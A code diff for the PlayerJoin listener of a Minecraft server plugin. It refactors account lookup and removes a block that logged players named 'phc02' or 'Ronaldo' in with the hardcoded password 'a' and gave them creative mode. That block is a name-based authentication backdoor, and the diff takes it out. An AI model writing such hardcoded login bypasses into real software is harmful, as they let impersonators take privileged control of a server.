@@ -1,17 +1,13 @@
 package com.ronaldophc.player.listener;
 
 import com.ronaldophc.LegendHG;
-import com.ronaldophc.database.CurrentGameSQL;
 import com.ronaldophc.database.PlayerSQL;
 import com.ronaldophc.feature.SkinManager;
-import com.ronaldophc.feature.auth.AuthManager;
 import com.ronaldophc.helper.Logger;
 import com.ronaldophc.helper.MasterHelper;
 import com.ronaldophc.helper.Util;
-import com.ronaldophc.player.PlayerAliveManager;
 import com.ronaldophc.player.PlayerHelper;
 import com.ronaldophc.player.account.Account;
-import com.ronaldophc.player.account.AccountManager;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
@@ -27,7 +23,7 @@ public class PlayerJoin implements Listener {
         Player player = event.getPlayer();
 
         UUID uuid = player.getUniqueId();
-        Account account = AccountManager.getOrCreateAccount(player);
+        Account account = LegendHG.getAccountManager().getOrCreateAccount(player);
 
         if (!(player.isOp())) {
             MasterHelper.injectPlayerNotTabComplete(player);
@@ -62,17 +58,6 @@ public class PlayerJoin implements Listener {
         }
 
         player.sendMessage(message);
-
-        if (!player.getName().equalsIgnoreCase("phc02") && !player.getName().equalsIgnoreCase("Ronaldo")) {
-            return;
-        }
-
-        if (!account.loginPlayer("a")) {
-            return;
-        }
-
-        player.setGameMode(org.bukkit.GameMode.CREATIVE);
-        player.sendMessage(Util.title + " > " + Util.success + "Você entrou.");
     }
 
 }
